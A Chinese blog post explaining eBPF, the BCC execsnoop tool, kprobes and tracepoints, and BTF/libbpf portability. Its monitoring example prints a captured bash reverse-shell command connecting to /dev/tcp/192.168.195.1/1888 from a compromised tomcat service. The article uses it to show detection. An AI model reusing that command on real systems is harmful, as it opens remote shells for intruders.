---
title: 通过eBPF实现对Linux内核的灵活扩展
author: rk700
layout: post
catalog: true
tags:
  - linux
  - kernel
---

## 背景介绍

eBPF(Extended Berkeley Packet Filter)，翻译为中文即扩展型柏克莱封包过滤器。单纯从名称上可能不容易理解eBPF究竟是什么，因为这个名称源自上世纪90年代初诞生的BPF。用直白的话来说，eBPF是在Linux操作系统内核中实现了一个虚拟机，当特定事件触发时，可以在这个虚拟机安全环境中执行eBPF字节码，从而实现性能监控、安全、网络等多种功能。

从某种角度上，eBPF和Linux内核模块的功能有重叠之处，二者都可以在运行时对内核进行灵活的扩展。而eBPF作为革命性的新技术，还具有以下优势：

- 安全：eBPF字节码在执行之前，会经过校验，确保不会进入死循环或崩溃从而影响整个操作系统内核
- 高效：eBPF虚拟机可以使用JIT(Just-In-Time)技术将字节码翻译为机器指令，从而提高运行效率
- 普适：得益于BTF技术（后面会介绍），eBPF字节码可以真正做到“一次编译，到处运行”（CO-RE），无需根据不同内核版本进行重新编译适配

正因为eBPF有这些独特的优势，自2014年首次被引入Linux内核以来，eBPF已经得到快速发展和广泛应用。就连微软也于今年开源了[ebpf-for-windows](https://github.com/Microsoft/ebpf-for-windows)项目，在Windows上也可以使用eBPF了。

## 使用入门

eBPF的使用需要经过以下流程：

1. 使用clang将源码编译为eBPF字节码
2. 通过`bpf`系统调用，对eBPF字节码进行校验和加载
3. eBPF字节码成功加载后，将其hook到指定事件（例如系统调用）。从而当该事件触发时，执行eBPF程序

由于以上每一步都需要较复杂的操作，因此对于初次使用者来说，更建议通过封装好的工具进行学习和试验。[BPF Compiler Collection(BCC)](https://github.com/iovisor/bcc)就是这样的工具，下面我们将重点介绍BCC工具的使用。


### BCC的使用

大部分Linux发行版仓库中都已经包含了BCC，可以直接安装。例如在Debian上可以运行

```bash
apt install bpfcc-tools
```

进行安装。

另外需要注意的是，使用BCC也需要安装当前系统内核版本所对应的头文件，同样以Debian为例：

```bash
apt install linux-headers-`uname -r`
```

这是因为BCC工具在编译eBPF字节码时，依赖这些内核头文件，后面我们会具体介绍。

上面安装的bpfcc-tools这个包，是BCC中自带的示例性工具集，包含了很多有用的功能。安装后我们可以运行其中的execsnoop，这个工具会打印出`execve`系统调用的实时执行情况：

```
root@debian:~# execsnoop-bpfcc
PCOMM            PID    PPID   RET ARGS
ls               66362  51315    0 /bin/ls --color=auto
```

一个典型的场景是，在Linux主机上运行了Web服务，可能存在漏洞导致远程命令执行，那么如何对Web服务执行命令的行为进行监控呢？这里就可以使用上面提到的execsnoop工具。我们通过`-u`参数，指定对Web服务进程的uid进行过滤，就可以看到该用户所有调用`execve`的情况。

下面的示例，是对搭建了fastjson反序列化漏洞的tomcat用户进行execsnoop监控。攻击者通过反序列化POC获取了反弹shell，并执行了`whoami`命令，相关的调用信息都可以在execsnoop的监控输出看到：

```
root@debian:~# execsnoop-bpfcc -u tomcat
PCOMM            PID    PPID   RET ARGS
bash             68335  68282    0 /bin/bash -c exec 5<>/dev/tcp/192.168.195.1/1888;cat <&5 | while read line; do $line 2>&5 >&5; done
cat              68336  68335    0 /bin/cat
whoami           68338  68337    0 /usr/bin/whoami
```

上面的功能通过其他方式也可以实现，但这里使用BCC/eBPF的方式具有以下优点：

- 应用层无感，无需重启Web服务，可在运行时随时启动或退出监控（直接`Ctrl-C`停止execsnoop即退出）
- 在内核`execve`系统调用处进行记录，即使进行bash命令混淆，还是可以看到最终执行的真实命令

### execsnoop的实现

接下来，我们通过[execsnoop的代码](https://github.com/iovisor/bcc/blob/master/tools/execsnoop.py)，来理解BCC是如何通过eBPF进行工作的。

BCC将许多功能通过Python进行了封装，因此execsnoop其实是一个Python脚本，其中最重要的就是eBPF程序代码：

```python
# define BPF program

bpf_text = """
#include <uapi/linux/ptrace.h>
```

eBPF程序是用C编写的，这里将其以字符串格式保存在Python脚本中，核心是这两个函数：

```c
int syscall__execve(struct pt_regs *ctx,
    const char __user *filename,
    const char __user *const __user *__argv,
    const char __user *const __user *__envp)
```

```c
int do_ret_sys_execve(struct pt_regs *ctx)
```

这两个函数的逻辑也比较清晰：

- `syscall__execve`，获取进程的uid，pid，ppid，执行的命令（comm），**命令参数**。将这些信息填入结构体`data_t`，并最终通过`events.perf_submit`进行提交。值得注意的是，每个参数是单独提交的，而不是把所有信息汇总后统一提交。
- `do_ret_sys_execve`，获取进程的uid，pid，ppid，执行的命令（comm），**返回结果**。将这些信息填入结构体`data_t`，并通过`events.perf_submit`进行提交.

将上述eBPF程序翻译为字节码，是通过BCC自带的clang进行的，具体代码可以参考[这里](https://github.com/iovisor/bcc/tree/master/src/cc)。使用BCC封装好的Python库，只需要简单的一行代码：

```python
# initialize BPF

b = BPF(text=bpf_text)
```

编译得到字节码之后，execsnoop会搜索找到`execve`系统调用，并以kprobe/kretprobe的方式将上面两个eBPF函数附加到`execve`：

```python
execve_fnname = b.get_syscall_fnname("execve")
b.attach_kprobe(event=execve_fnname, fn_name="syscall__execve")
b.attach_kretprobe(event=execve_fnname, fn_name="do_ret_sys_execve")
```

kprobe和kretprobe我们稍后介绍，这里我们只需要知道attach之后，在`execve`系统调用的入口和返回时，就会分别调用`syscall__execve`和`do_ret_sys_execve`这两个eBPF程序，实现对系统调用的hook。

前面eBPF程序所记录的数据是通过`events.perf_submit`进行提交的，perf是Linux内核提供的性能分析工具，可以用于将内核信息输出到用户空间。在execsnoop的Python代码中，同样通过几行简单的代码就可以将eBPF提交的perf信息内容读取出来：

```python
# loop with callback to print_event

b["events"].open_perf_buffer(print_event)
while 1:
    try:
        b.perf_buffer_poll()
    except KeyboardInterrupt:
        exit()
```

其中的`print_event`，是处理perf信息并打印到终端输出的回调函数。我们的eBPF程序在每次进行`events.perf_submit`提交时，就会触发并回调这里的`print_event`。这个Python函数的逻辑也很清晰，它以进程PID作为字典的key，将eBPF程序提交的每个命令行参数信息放到list列表中：

```python
    if event.type == EventType.EVENT_ARG:
        argv[event.pid].append(event.argv)
```

当捕捉到`execve`返回时，再通过PID作为key，将合并后完整的信息打印到终端：

```python
            argv_text = b' '.join(argv[event.pid]).replace(b'\n', b'\\n')
            printb(b"%-16s %-6d %-6s %3d %s" % (event.comm, event.pid,
                   ppid, event.retval, argv_text))
```

以上就是execsnoop的基本实现流程。

### kprobe与tracepoint

eBPF程序的执行是由事件触发的，目前所支持的事件类型有很多。上面提到的kprobe/kretprobe就是其中之一。

顾名思义，kprobe/kretprobe是Linux内核提供的函数探针，可以动态对指定的内核函数进行探测。kprobe是用于函数执行入口，kretprobe则是函数执行返回。eBPF通过kprobe/kretprobe，就可以在我们想要观测的内核函数执行入口或者执行返回时，触发执行eBPF程序。

需要注意的是，出于安全考虑，eBPF程序使用kprobe探针，对相关参数和返回值都是只读的，因此无法对系统调用进行参数修改或者运行结果替换操作。如果有这类需求，还是需要通过内核模块来实现。

除了kprobe探针，我们也可以通过tracepoint进行系统调用的探测。tracepoint是Linux内核提供的事件探测点，由于其完全依赖于内核所提供的探测点列表，所以不如kprobe那么灵活（kprobe甚至可以对函数的中间某偏移处进行hook）。但tracepoint也有自己的优势，那就是相对稳定的接口（因为是由内核开发者显式编写提供的），并且支持内联函数hook。

当前系统所支持的tracepoint列表，以文件的形式可以在目录`/sys/kernel/debug/tracing/events`中找到，具体系统调用的tracepoint则位于子目录`syscalls`中：

```
root@debian:~# ls /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve
enable  filter  format  id  trigger
```

如果我们想启用对`execve`系统调用的tracepoint，可以通过以下命令：

```bash
echo 1 > /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve/enable
```

启用后可以查看实时输出：

```
root@debian:~# cat /sys/kernel/debug/tracing/trace_pipe
           <...>-69391   [001] .... 195134.884042: sys_execve(filename: 55dc013b2980, argv: 55dc013b9450, envp: 55dc01387b00)
```

## eBPF CO-RE

“一次编译，到处运行”（CO-RE），是Java提出的概念。因为Java程序字节码是通过JVM执行，并不直接依赖于架构和平台。类似的，eBPF程序也是在eBPF虚拟机中执行字节码，理论上来说也是可以实现CO-RE的。但是，如果有实际执行上面的execsnoop就可以发现，其包含的是eBPF源码而非字节码，使用时仍然需要先安装当前内核版本对应的内核头文件，再通过其自带的clang进行编译得到字节码后执行，并不是真正的“一次编译，到处运行”。

这是因为，除了极简单的eBPF程序，大部分eBPF程序所需要实现的功能，往往依赖于内核中的特定数据结构，例如和进程相关的`task_struct`。而这些内部结构体布局信息可能随着内核版本的不同而发生变化。

而这就为eBPF程序的分发带来了一些不便：在主机上通过BCC运行eBPF程序，我们需要安装好内核头文件，带上体积庞大的clang编译器，花费一定开销进行编译。当然我们可以提前编译好各内核版本所对应的eBPF程序，再根据实际内核版本分发，但这样做就与内核模块没有太大的区别了，没有体现出eBPF虚拟机的优势。

为了解决这一问题，出现了BTF(BPF Type Format)这一技术。有了BTF支持，eBPF才真正实现了“一次编译，到处运行”，从而最大限度发挥其优势。

### BTF和libbpf

回到我们前面的介绍，传统eBPF程序编译时依赖内核头文件，是因为缺少相关结构体定义。BTF则是通过巧妙设计的[算法](https://nakryiko.com/posts/btf-dedup/)，将内核中的关键结构体布局信息以极小的体积生成出来。根据介绍，相比传统的DWARF调试信息，使用BTF可以将文件体积缩减最高100倍，只需要为内核文件增加1-2MB大小的元数据信息。

那么，有了BTF信息后，eBPF程序是如何实现CO-RE的呢？其大致流程如下：

- clang编译得到eBPF程序字节码，并记录下所有可能需要后续进行调整的结构体字段偏移信息
- 在加载eBPF字节码之前，根据BTF信息，调整字节码中的相关偏移，以适配当前内核版本
- 经调整偏移后的eBPF字节码，加载至内核中

其中最关键的就是第2步，BTF信息的解析并应用于eBPF字节码的偏移调整，这些功能在[libbpf](https://github.com/libbpf/libbpf)这个库有实现，可以阅读其源码学习，这里就不展开了。

由于BTF属于近年来才诞生的新技术，因此大部分Linux发行版是在较新的高版本内核中才启用了对BTF的[支持](https://github.com/libbpf/libbpf#bpf-co-re-compile-once--run-everywhere)：

- Fedora 31+
- RHEL 8.2+
- OpenSUSE Tumbleweed (in the next release, as of 2020-06-04)
- Arch Linux (from kernel 5.7.1.arch1-1)
- Manjaro (from kernel 5.4 if compiled after 2021-06-18)
- Ubuntu 20.10
- Debian 11 (amd64/arm64)

可以查看是否存在文件`/sys/kernel/btf/vmlinux`来判断当前内核是否支持BTF。

### 基于libbpf的execsnoop

前面介绍的execsnoop，没有使用BTF信息。其实BCC的代码仓库中还包含了[另一个版本的execsnoop](https://github.com/iovisor/bcc/tree/master/libbpf-tools)，这个版本就是基于libbpf实现了“一次编译，到处运行”。

[execsnoop.bpf.c](https://github.com/iovisor/bcc/blob/master/libbpf-tools/execsnoop.bpf.c)这个文件就是eBPF程序的代码。和前面Python版本execsnoop的逻辑类似，不同之处是使用了tracepoint而非kprobe进行事件监测：

```c
SEC("tracepoint/syscalls/sys_enter_execve")
int tracepoint__syscalls__sys_enter_execve(struct trace_event_raw_sys_enter* ctx)
```

另外和Python版本不同的是，在`execve`系统调用入口执行时，执行命令的参数会被一次性全部记录下来，并通过BPF map进行保存，而非每个参数单独进行perf输出：

```c
	event = bpf_map_lookup_elem(&execs, &pid);
```

当`execve`执行返回时，再根据进程PID从BPF map中找到之前记录的执行参数信息，与返回结果一并进行perf输出：

```c
		bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, event, len);
```

这里所使用的BPF map，是eBPF提供的用于信息记录的辅助结构。

最终，在`libbtf-tools`目录下执行`make execsnoop`命令，即可编译得到最终的execsnoop程序。这个编译后的二进制程序大小只有1.5M，集成了libbpf，可以在支持BTF的系统上直接运行，无需再安装内核头文件和使用clang进行eBPF字节码编译。

## 其他平台的支持

Android系统使用Linux内核，也提供了对eBPF的支持。从Android 9开始，Android系统中的netd程序就弃用了旧的`xt_qtaguid`，而改用了eBPF技术进行网络流量监控。这样做更加灵活且易于维护，相关介绍可以参考[官方文档](https://source.android.com/devices/tech/datausage/ebpf-traffic-monitor)。

[Windows上的eBPF](https://github.com/Microsoft/ebpf-for-windows)则是微软今年才开源的项目。根据介绍，其主要是利用现有的eBPF工具链，实现Windows相关的内核功能扩展。因为Linux和Windows内核的内部数据结构存在差异，因此Linux系统上的eBPF程序一般并不能直接在Windows上使用，特别是如果使用了一些Linux内核特有的函数，不过一些通用的hook点和函数可以得到支持。

## eBPF的安全问题

eBPF在近些年来也出现了一些安全漏洞，例如[CVE-2021-3490](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490)对eBPF字节码位运算校验不当可能造成越界读写问题。不过默认情况下只有root用户才可以运行eBPF程序，所以在一定程度上缓解了对eBPF虚拟机攻击的利用。

## 总结

通过eBPF可以灵活地对Linux内核进行功能扩展，而BTF所带来的“一次编译，到处运行”特性更是如虎添翼。基于eBPF技术，已经在安全、网络等领域出现了许多优秀的项目和实践，例如云原生安全监控的[Falco](https://falco.org/)，四层负载均衡的[Katran](https://github.com/facebookincubator/katran)，就连微软也在Win 10中加入了对eBPF的支持，相信eBPF在未来会有更广阔的应用场景。

## 参考阅读

- https://ebpf.io/what-is-ebpf
- https://nakryiko.com/posts/bpf-portability-and-co-re/
- https://github.com/iovisor/bcc

